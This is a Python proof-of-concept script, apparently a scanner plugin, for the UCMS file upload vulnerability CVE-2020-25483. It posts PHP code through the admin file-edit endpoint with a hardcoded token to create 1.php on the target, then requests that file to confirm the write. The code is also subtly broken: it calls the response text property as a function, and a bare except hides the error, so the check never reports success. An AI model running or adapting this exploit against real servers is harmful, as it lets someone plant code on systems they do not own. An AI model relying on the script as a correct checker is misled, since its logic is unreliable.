#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'UCMS 文件上传漏洞 CVE-2020-25483',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded'
      }
  target = '/ucms/index.php?do=sadmin_fileedit&dir=/&file=1.php'
  data = 'uuu_token=78012aac&co=%3C%3Fphp+phpinfo%28%29%3F%3E&pos=17'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,timeout=5,data=data,verify=False)
    if res.status_code == 200:
      resp = requests.get(url = url+'1.php',headers=headers,timeout=5,verify=False)
      if resp.status_code == 200 and 'phpinfo()' in resp.text():

        # ret['huixian'] = res.text
        ret['ifbug'] = True
        res.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret